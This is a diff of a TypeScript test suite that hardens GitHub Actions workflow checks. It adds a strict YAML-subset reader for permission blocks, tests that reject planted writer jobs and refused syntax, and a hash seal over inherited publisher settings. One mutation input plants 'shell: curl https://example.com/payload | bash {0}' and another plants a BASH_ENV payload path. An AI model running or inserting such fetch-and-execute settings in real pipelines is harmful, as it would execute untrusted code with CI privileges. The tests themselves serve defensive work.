@@ -81,7 +81,55 @@ describe("queue completion trust boundary", () => {
 
 describe("CI image mirror workflow controls", () => {
   const mirror = readFileSync(join(ROOT, ".github/workflows/mirror-ci-images.yml"), "utf8");
-  const permissionBlocks = (source: string) => [...source.matchAll(/^( *)["']?permissions["']? *:([^\n]*)\n((?:\1 +[^\n]*\n)*)/gmu)].map(([block]) => block.trimEnd());
+  // This is a deliberately restricted workflow reader, not a general YAML parser.
+  // Refuse syntax outside the subset before discovering permissions or sealing jobs.
+  const permissionBlocks = (source: string) => {
+    expect(source, "workflow tabs are refused; use spaces").not.toMatch(/\t/u);
+    const blocks: Array<{ job: string; block: string }> = [], keys = new Set<string>();
+    let root = "", job = "", previousIndent = -2, scalarIndent: number | undefined, permissionIndent: number | undefined;
+    for (const line of source.split("\n")) {
+      if (!line.trim() || line.trimStart().startsWith("#")) continue;
+      const indent = line.length - line.trimStart().length;
+      if (scalarIndent !== undefined && indent > scalarIndent) continue;
+      scalarIndent = undefined;
+      expect(indent % 2, "workflow indentation must use pairs of spaces").toBe(0);
+      expect(indent, "workflow indentation must not skip mapping levels").toBeLessThanOrEqual(previousIndent + 2);
+      previousIndent = indent;
+      expect(line, "workflow anchors, aliases and merge keys are refused; write explicit mappings").not.toMatch(/(?:^|[\s{[,])[&*](?!&(?:\s|$))[^\s,[\]{}]+|<<["']?\s*:/u);
+      expect(line, "workflow documents/directives are refused; use one document").not.toMatch(/^(?:---|\.\.\.)(?:\s|$)|^%/u);
+      if (permissionIndent !== undefined && indent > permissionIndent) {
+        expect(line, "permission block entries must be plain scope: read/write/none").toMatch(new RegExp(`^ {${permissionIndent + 2}}[a-z][a-z-]*: (?:read|write|none)$`, "u"));
+        blocks[blocks.length - 1]!.block += `\n${line}`;
+        continue;
+      }
+      permissionIndent = undefined;
+      if (indent === 0 || (root === "jobs" && indent <= 4)) {
+        const field = /^( *)([a-z][a-z-]*):(?: (.*))?$/u.exec(line);
+        expect(field, "workflow/job keys must be plain block mappings at canonical indentation").not.toBeNull();
+        const [, , key, value = ""] = field!;
+        const scope = indent === 0 ? "workflow" : indent === 2 ? "jobs" : `job:${job}`;
+        expect(keys.has(`${scope}:${key}`), "duplicate workflow/job keys are refused").toBe(false);
+        keys.add(`${scope}:${key}`);
+        if (indent === 0) {
+          expect(root, "workflow keys must precede jobs").not.toBe("jobs");
+          root = key!;
+          if (root === "jobs") expect(value, "jobs must be a block mapping").toBe("");
+        } else if (indent === 2) {
+          expect(value, "flow-form jobs are refused; use a block job mapping").toBe("");
+          job = key!;
+        }
+        expect(key, "workflow/job defaults are refused; use explicit step settings").not.toBe("defaults");
+        if (key === "permissions") {
+          expect(value, "permissions must be a single-line plain map or block map").toMatch(/^(?:\{(?:[a-z][a-z-]*: (?:read|write|none)(?:, [a-z][a-z-]*: (?:read|write|none))*)?\})?$/u);
+          blocks.push({ job: root === "jobs" ? job : "", block: line });
+          if (!value) permissionIndent = indent;
+        }
+      }
+      if (/^( *)(?:- )?[a-z][a-z0-9-]*: [|>][-+]?$/u.test(line)) scalarIndent = indent;
+    }
+    expect(root, "workflow requires a final block jobs mapping").toBe("jobs");
+    return blocks;
+  };
   const firstPartyActions = [
     ["actions/checkout", "3d3c42e5aac5ba805825da76410c181273ba90b1"],
     ["actions/setup-node", "249970729cb0ef3589644e2896645e5dc5ba9c38"],
@@ -92,7 +140,7 @@ describe("CI image mirror workflow controls", () => {
   push:
     branches: [main]
     paths: [config/ci-images.json, scripts/ci-image-mirror.mjs, .github/workflows/mirror-ci-images.yml]`);
-    expect(permissionBlocks(source)).toEqual(["permissions: {contents: read}", "    permissions: {contents: read, packages: write}"]);
+    expect(permissionBlocks(source).map(({ block }) => block)).toEqual(["permissions: {contents: read}", "    permissions: {contents: read, packages: write}"]);
     expect([...(source.split("\njobs:\n")[1] ?? "").matchAll(/^ {2}([a-z-]+):$/gmu)].map((match) => match[1])).toEqual(["mirror"]);
     // Inspect every run form, including a step beginning with `- run:` and folded blocks.
     let runIndent: number | undefined;
@@ -150,10 +198,10 @@ describe("CI image mirror workflow controls", () => {
     .map((name) => ({ name, source: readFileSync(join(ROOT, ".github/workflows", name), "utf8") }));
   const assertExactWriters = (sources: Array<{ name: string; source: string }>) => {
     const writers = sources.flatMap(({ name, source }) => permissionBlocks(source)
-      .filter((block) => /\bwrite-all\b|["']?packages["']? *: *["']?write\b/u.test(block)).map((block) => ({ name, block })));
+      .filter(({ block }) => /\bpackages: write\b/u.test(block)).map((permission) => ({ name, ...permission })));
     expect(writers).toEqual([
-      { name: "mirror-ci-images.yml", block: "    permissions: {contents: read, packages: write}" },
-      { name: "registry-tutorial.yml", block: "    permissions: {packages: write}" },
+      { name: "mirror-ci-images.yml", job: "mirror", block: "    permissions: {contents: read, packages: write}" },
+      { name: "registry-tutorial.yml", job: "publish-qualified-image", block: "    permissions: {packages: write}" },
     ]);
   };
 
@@ -166,8 +214,43 @@ describe("CI image mirror workflow controls", () => {
     "name: Planted\njobs:\n  planted:\n    permissions: {packages: write}\n",
     "name: Planted\npermissions:\n  contents: read\n  packages: write\njobs: {}\n",
     'name: Planted\njobs:\n  planted:\n    "permissions": { "packages" : "write" }\n',
+    "name: Planted\njobs:\n  planted:\n    permissions:\n\n      packages: write\n",
+    "name: Planted\njobs:\n  planted:\n    permissions:\n      contents: read\n\n      packages: write\n",
   ])("rejects a third writer in alternate permission spelling: %s", (source) => {
     expect(() => assertExactWriters([...workflows(), { name: "planted.yml", source }])).toThrow();
+  });
+
+  it("reads permission entries across leading and internal blank lines until dedent", () => {
+    expect(permissionBlocks("permissions:\n\n  contents: read\n\n  actions: read\njobs:\n  planted:\n    permissions: {}\n")).toEqual([
+      { job: "", block: "permissions:\n  contents: read\n  actions: read" }, { job: "planted", block: "    permissions: {}" },
+    ]);
+  });
+  it.each([
+    ["jobs:\n  planted: {runs-on: ubuntu-24.04, permissions: {packages: write}, steps: [{run: 'echo planted'}]}\n", "flow-form jobs"],
+    ["jobs: {planted: {permissions: {packages: write}}}\n", "jobs must be a block mapping"],
+    ["jobs:\n  planted:\n\tpermissions: {}\n", "tabs"],
+    ["env: &shared {VALUE: x}\njobs:\n  planted:\n", "anchors, aliases and merge keys"],
+    ["env: *shared\njobs:\n  planted:\n", "anchors, aliases and merge keys"],
+    ["env: &*shared {VALUE: x}\njobs:\n  planted:\n", "anchors, aliases and merge keys"],
+    ["env: **shared\njobs:\n  planted:\n", "anchors, aliases and merge keys"],
+    ["jobs:\n  planted:\n    <<: {permissions: {packages: write}}\n", "anchors, aliases and merge keys"],
+    ['env: {"<<": {VALUE: x}}\njobs:\n  planted:\n', "anchors, aliases and merge keys"],
+    ["---\njobs:\n  planted:\n", "documents/directives"],
+    ["jobs:\n  planted:\n...\n---\njobs:\n  other:\n", "documents/directives"],
+    ["%YAML 1.2\njobs:\n  planted:\n", "documents/directives"],
+    ['"jobs":\n  planted:\n', "plain block mappings"],
+    ["jobs:\n  planted:\n   permissions: {}\n", "pairs of spaces"],
+    ["jobs:\n    planted: {permissions: {packages: write}}\n", "must not skip mapping levels"],
+    ["jobs:\n  planted:\n      permissions: {packages: write}\n", "must not skip mapping levels"],
+    ["jobs:\n  planted:\n    permissions: {\n      packages: write}\n", "single-line plain map or block map"],
+    ["jobs:\n  planted:\n    permissions:\n      packages: 'write'\n", "plain scope"],
+    ["jobs:\n  planted:\n    permissions: {}\n    permissions: {}\n", "duplicate workflow/job keys"],
+    ["jobs:\n  planted:\nenv: {VALUE: x}\n", "workflow keys must precede jobs"],
+    ["defaults: {run: {shell: bash}}\njobs:\n  planted:\n", "workflow/job defaults"],
+    ["jobs:\n  planted:\n    defaults: {run: {shell: bash}}\n", "workflow/job defaults"],
+    ["name: Planted\n", "requires a final block jobs mapping"],
+  ])("refuses unsupported workflow syntax by name: %s", (source, refusal) => {
+    expect(() => assertExactWriters([...workflows(), { name: "planted.yml", source }])).toThrow(refusal);
   });
 
   it("rejects another writer inside the qualified-image workflow", () => {
@@ -180,7 +263,7 @@ describe("CI image mirror workflow controls", () => {
   const assertPublisherControls = (source: string) => {
     const writer = workflowJob("publish-qualified-image", source);
     expect(writer).toContain("    needs: exact-set-qualification\n    if: ${{ needs.exact-set-qualification.result == 'success' }}\n");
-    expect(permissionBlocks(writer)).toEqual(["    permissions: {packages: write}"]);
+    expect(permissionBlocks(source).filter(({ job }) => job === "publish-qualified-image")).toEqual([{ job: "publish-qualified-image", block: "    permissions: {packages: write}" }]);
     // No checkout at all: downloaded data is verified, never executed. Only these
     // full-SHA first-party actions may run alongside the reviewed shell program.
     expect([...writer.matchAll(/uses: ([^@\n]+)@([^\s#]+)/gu)].map((match) => [match[1], match[2]])).toEqual([
@@ -193,9 +276,22 @@ describe("CI image mirror workflow controls", () => {
     expect(runs[0]).not.toContain("${{");
     // Seal the reviewed skopeo + shell/jq writer, including env and alternate YAML
     // run forms; shell allowlists cannot prove that candidate code stays inert.
-    expect(createHash("sha256").update(writer).digest("hex")).toBe("2a42aca8ccfcdf43a4b42874846b106bd1c3e57c1ce79ce5cd4fdd73378cc527");
+    // Canonical workflow keys precede jobs, so this also seals inherited env,
+    // permissions, triggers and concurrency. Defaults are refused above.
+    expect(createHash("sha256").update(source.split("\njobs:\n")[0]! + writer).digest("hex")).toBe("1298858d7c58df090e72f213917a6d50a438c64a88ef24ac1eb6a5adddef28ff");
   };
   it("publishes only successful qualification data without executing candidate code", () => assertPublisherControls(qualification));
+  it.each([
+    ["jobs:\n", "defaults:\n  run:\n    shell: curl https://example.com/payload | bash {0}\njobs:\n"],
+    ["    needs: exact-set-qualification\n", "    defaults: {run: {shell: bash}}\n    needs: exact-set-qualification\n"],
+    ["jobs:\n", "env: {BASH_ENV: /tmp/payload}\njobs:\n"],
+    ["permissions: {}\n", "permissions: {contents: read}\n"],
+    ["  workflow_run:\n", "  pull_request:\n"],
+    ["  cancel-in-progress: false", "  cancel-in-progress: true"],
+  ])("seals inherited publisher execution settings: %s", (before, after) => {
+    expect(qualification).toContain(before);
+    expect(() => assertPublisherControls(qualification.replace(before, after))).toThrow();
+  });
   it.each([
     ["needs: exact-set-qualification", "needs: registry-tutorial"],
     ["needs.exact-set-qualification.result == 'success'", "always()"],
